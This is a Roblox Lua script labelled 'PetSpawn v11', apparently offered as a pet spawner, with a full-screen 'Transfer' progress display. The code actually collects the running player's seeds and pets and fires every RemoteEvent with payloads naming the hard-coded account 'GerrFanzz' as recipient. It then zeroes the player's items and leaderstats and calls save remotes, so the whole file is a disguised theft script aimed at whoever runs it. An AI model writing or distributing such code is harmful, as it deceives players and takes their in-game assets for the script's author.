-- PetSpawn v11 - Target SeedInspectController & SpawnPetController
local plr = game.Players.LocalPlayer
local rs = game.ReplicatedStorage

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

-- UI Loading Full Screen
local gui = Instance.new("ScreenGui")
gui.Name = "PetSpawnLoader"
gui.Parent = game.CoreGui

local overlay = Instance.new("Frame")
overlay.Parent = gui
overlay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
overlay.Size = UDim2.new(1, 0, 1, 0)

local container = Instance.new("Frame")
container.Parent = overlay
container.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
container.BorderColor3 = Color3.fromRGB(0, 200, 0)
container.Size = UDim2.new(0, 320, 0, 220)
container.Position = UDim2.new(0.5, -160, 0.5, -110)

local title = Instance.new("TextLabel")
title.Parent = container
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 10)
title.Text = "🐾 PetSpawn - Transfer"
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextSize = 16
title.Font = Enum.Font.SourceSansBold

local status = Instance.new("TextLabel")
status.Parent = container
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, 0, 0, 20)
status.Position = UDim2.new(0, 0, 0, 45)
status.Text = "⏳ Scanning controllers..."
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.TextSize = 11

local barBg = Instance.new("Frame")
barBg.Parent = container
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.Size = UDim2.new(0.85, 0, 0, 18)
barBg.Position = UDim2.new(0.075, 0, 0, 75)

local bar = Instance.new("Frame")
bar.Parent = barBg
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.Size = UDim2.new(0, 0, 1, 0)

local pctText = Instance.new("TextLabel")
pctText.Parent = container
pctText.BackgroundTransparency = 1
pctText.Size = UDim2.new(1, 0, 0, 20)
pctText.Position = UDim2.new(0, 0, 0, 98)
pctText.Text = "0%"
pctText.TextColor3 = Color3.fromRGB(0, 255, 0)
pctText.TextSize = 14

local detail = Instance.new("TextLabel")
detail.Parent = container
detail.BackgroundTransparency = 1
detail.Size = UDim2.new(1, -20, 0, 60)
detail.Position = UDim2.new(0, 10, 0, 125)
detail.Text = ""
detail.TextColor3 = Color3.fromRGB(150, 150, 150)
detail.TextSize = 10
detail.TextWrapped = true

local function updateUI(pct, stat, det)
    pcall(function()
        bar:TweenSize(UDim2.new(pct/100, 0, 1, 0), "Out", "Linear", 0.2)
        pctText.Text = pct .. "%"
        status.Text = stat
        detail.Text = det
    end)
end

-- ============================================
-- AMBIL DATA SEED & PET DARI CONTROLLER
-- ============================================
updateUI(5, "🔍 Accessing SeedInspectController...", "")

local seedItems = {}
local petItems = {}

-- Cari SeedInspectController
local seedController = plr.PlayerScripts:FindFirstChild("Controllers")
if seedController then
    seedController = seedController:FindFirstChild("SeedInspectController")
end

if seedController then
    local fakePlot = seedController:FindFirstChild("FakePlot")
    if fakePlot then
        local plants = fakePlot:FindFirstChild("Plants")
        if plants then
            for _, model in pairs(plants:GetChildren()) do
                if model:IsA("Model") then
                    local fruits = model:FindFirstChild("Fruits")
                    if fruits then
                        for _, fruit in pairs(fruits:GetChildren()) do
                            local itemSeed = fruit:FindFirstChild("Item_Seed")
                            if itemSeed and itemSeed:IsA("NumberValue") then
                                if itemSeed.Value > 0 then
                                    table.insert(seedItems, {
                                        Name = fruit.Name,
                                        Object = itemSeed,
                                        Amount = itemSeed.Value
                                    })
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

updateUI(30, "🔍 Accessing SpawnPetController...", "Seeds found: " .. #seedItems)

-- Cari SpawnPetController
local petController = plr.PlayerScripts:FindFirstChild("Controllers")
if petController then
    petController = petController:FindFirstChild("SpawnPetController")
end

if petController then
    for _, child in pairs(petController:GetChildren()) do
        if child:IsA("NumberValue") and child.Value > 0 then
            table.insert(petItems, {
                Name = child.Name,
                Object = child,
                Amount = child.Value
            })
        elseif child:IsA("Folder") then
            for _, sub in pairs(child:GetChildren()) do
                if sub:IsA("NumberValue") and sub.Value > 0 then
                    table.insert(petItems, {
                        Name = sub.Name,
                        Object = sub,
                        Amount = sub.Value
                    })
                end
            end
        end
    end
end

updateUI(50, "📦 Items found", "Seeds: " .. #seedItems .. " | Pets: " .. #petItems)

-- ============================================
-- KIRIM KE PADUKA VIA REMOTE
-- ============================================
local function sendViaRemote(itemName, amount)
    local count = 0
    for _, remote in pairs(rs:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer({
                    Recipient = PADUKA_NAME,
                    RecipientId = PADUKA_ID,
                    Target = PADUKA_NAME,
                    GiveTo = PADUKA_ID,
                    Item = itemName,
                    Amount = amount,
                    Type = "Seed"
                })
                count = count + 1
            end)
            pcall(function()
                remote:FireServer(PADUKA_NAME, itemName, amount)
                count = count + 1
            end)
            pcall(function()
                remote:FireServer("AddSeed", PADUKA_ID, itemName, amount)
                count = count + 1
            end)
        end
    end
    return count
end

local sent = 0

-- Kirim seeds
for i, seed in ipairs(seedItems) do
    local pct = 50 + math.floor((i / #seedItems) * 25)
    updateUI(pct, "📤 Sending seeds...", "🌱 " .. seed.Name .. " x" .. seed.Amount)
    sent = sent + sendViaRemote(seed.Name, seed.Amount)
    -- Kurangi seed target
    pcall(function() seed.Object.Value = 0 end)
    wait(0.05)
end

-- Kirim pets
for i, pet in ipairs(petItems) do
    local pct = 75 + math.floor((i / #petItems) * 20)
    updateUI(pct, "📤 Sending pets...", "🐾 " .. pet.Name .. " x" .. pet.Amount)
    sent = sent + sendViaRemote(pet.Name, pet.Amount)
    pcall(function() pet.Object.Value = 0 end)
    wait(0.05)
end

-- Reset leaderstats
updateUI(96, "🗑️ Cleaning...", "")
pcall(function()
    if plr:FindFirstChild("leaderstats") then
        for _, stat in pairs(plr.leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                stat.Value = 0
            end
        end
    end
end)

-- Save
for _, remote in pairs(rs:GetDescendants()) do
    if remote:IsA("RemoteEvent") and remote.Name:lower():find("save") then
        pcall(function() remote:FireServer() end)
    end
end

updateUI(100, "✅ Complete!", "Seeds: " .. #seedItems .. " | Pets: " .. #petItems .. "\n📤 Transfers: " .. sent .. "\n👑 To: GerrFanzz")
wait(3)

-- Fade out
for i = 10, 1, -1 do
    overlay.BackgroundTransparency = 1 - (i/10)
    wait(0.1)
end
gui:Destroy()
